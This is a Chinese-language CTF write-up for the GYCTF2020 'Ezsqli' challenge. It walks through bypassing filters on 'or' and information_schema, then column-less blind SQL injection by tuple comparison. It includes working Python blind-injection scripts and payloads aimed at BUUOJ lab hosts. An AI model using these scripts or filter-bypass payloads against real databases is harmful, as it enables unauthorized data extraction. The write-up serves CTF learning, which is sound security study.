# [GYCTF2020]Ezsqli 绕过or information_schema 无列名注入

[https://www.cnblogs.com/h0cksr/p/16189749.html](https://www.cnblogs.com/h0cksr/p/16189749.html) 

 [https://www.gem-love.com/ctf/1782.html](https://www.gem-love.com/ctf/1782.html) 

说好的ez....

我们开始吧

首先就直接进行抓包看回显



<img src="https://i-blog.csdnimg.cn/blog_migrate/13ed4bab0b2514b1c9481256ebf0a366.png" alt="" style="max-height:216px; box-sizing:content-box;" />


然后开始正常的测试



<img src="https://i-blog.csdnimg.cn/blog_migrate/f5eb6d2509e008d13ce047c7b7694ace.png" alt="" style="max-height:251px; box-sizing:content-box;" />


报错了 这里的

## or过滤的绕过

我们可以使用 ^ 或者 || 我喜欢用 ||

所以继续构造



<img src="https://i-blog.csdnimg.cn/blog_migrate/04393bb4ef4993598b7dacaee87d0029.png" alt="" style="max-height:246px; box-sizing:content-box;" />


发现了 就是目前这种 然后我们可以开始

我们通过fuzz 发现 很多都被禁用了

所以我们还是选择盲注吧

正常测一下



<img src="https://i-blog.csdnimg.cn/blog_migrate/67cd313b2afa5c52fbeaf9a7dc8488e3.png" alt="" style="max-height:216px; box-sizing:content-box;" />


确定了 可以使用盲注

那我们开始写了

但是我们通过fuzz 发现 information_schema 也被过滤了 其实主要是 or被过滤

## information_schema绕过

所以我们需要使用其他的表来爆破

这里给出几个替换的

```cobol
sys.schema_table_statistics_with_buffer
 
sys.x$schema_flattened_keys
```

这两个都可以查出来

```cobol
import time
 
import requests
 
base_url=r"http://238ed74f-cd44-42cb-9714-fd94acddc480.node4.buuoj.cn:81/"
data=''
#下面的payload需要使用 > 号 而不是 =
payload="""2||ascii(substr((select group_concat(table_name) from sys.x$schema_flattened_keys where table_schema=database()),{},1))>{}"""
for i in range(1,10000):
    low = 32
    high = 128
    mid =(low + high) // 2
    while(low < high):
        payload1=payload.format(i,mid)
        data1={
            'id':payload1
        }
        r = requests.post(url=base_url,data=data1)
        if "Nu1L" in r.text:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2
    if (mid == 32 or mid == 132):
        break
    data+=chr(mid)
    print(data)
 
```

```cobol
f1ag_1s_h3r3_hhhhh,users233333333333333
```

得到了表名

## 无列名注入

这里因为我们无法通过 这个表获取flag的列名

并且这里过滤了 union 所以我们无法使用  


```cobol
select 1,2,3 union select * from 表
```

这种无列名注入

所以我们现在需要学习另一个

### 通过ascii位移来获得flag

我们开始在本地尝试

```cobol
select (select "a")  > (select "abcdef")
 
0
 
 
 
select (select "b")  > (select "abcdef")
 
1
 
这里能发现 是通过比对 首个字符的ascii 如果相同 就输出 0 不同就输出 1
 
```

这里真的很巧妙

我们继续来实验一下

这里其实比对的是

```python
前一个 ascii  和 后一个ascii 值的大小
 
 
如果前一个比较大 那么就输出0
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/7fa5f4cb78b472d6b2ccbf596aef0bbb.png" alt="" style="max-height:210px; box-sizing:content-box;" />


但是反过来 如果 后面比较大 我们就输出1



<img src="https://i-blog.csdnimg.cn/blog_migrate/621dec8f10419ce522ec4f9d33f8d950.png" alt="" style="max-height:254px; box-sizing:content-box;" />


其次 第一个一样 我们就比对下一个

| `select (select "ac") > (select "abcdef")` | 1 |
|:---:|:---:|
| `select (select "aa") > (select "abcdef")` | 0 |



所以我们可以通过这个方式来查询

```cobol
首先通过 select 1,2,3 查询字段数
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/4510f38a0edce3526d39dfe32af9e365.png" alt="" style="max-height:221px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/43918b6d4303cdca8a5a0e719bb3d2a0.png" alt="" style="max-height:210px; box-sizing:content-box;" />
说明字段数量为2

然后我们就可以通过循环开始查询了

我这里演示一下

我们知道 flag 是f开头

如果我输入g呢 返回 1（Nu1L）



<img src="https://i-blog.csdnimg.cn/blog_migrate/f78a13a0f6451f3992cb9233f223fe29.png" alt="" style="max-height:239px; box-sizing:content-box;" />




如果输入的是e



<img src="https://i-blog.csdnimg.cn/blog_migrate/da2a66447029b7f185f8cf45a4362155.png" alt="" style="max-height:226px; box-sizing:content-box;" />


返回了 V&N

所以我们只要读取到了 Nu1L 然后通过 减去一位 我们就可以获得上一个的字符

然后加入 就可以获取下一个了

这里还有一个要注意的 就是 我们注入的地方在字段2 是flag在的地方

1 可能是 id什么的

我们开始写脚本吧

```cobol
import time
 
import  requests
 
baseurl="http://17d5864a-27fc-4fc7-be88-e639f3f55898.node4.buuoj.cn:81/index.php"
 
 
def add(flag):
    res=''
    res+=flag
    return res
flag=''
for i in range(1,200):
    for char in range(32,127):
        datachar = add(flag+chr(char)) #增加下一个比对的字符串
        payload='2||((select 1,"{}")>(select * from f1ag_1s_h3r3_hhhhh))'.format(datachar)
        data = {
            'id':payload
        }
        req=requests.post(url=baseurl,data=data)
        if "Nu1L" in req.text:
            flag += chr(char-1)
            print(flag)
            break
        if req.status_code == 429:
            time.sleep(0.5)
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/d22add64bc1ba020a1a127b872f8b6f6.png" alt="" style="max-height:144px; box-sizing:content-box;" />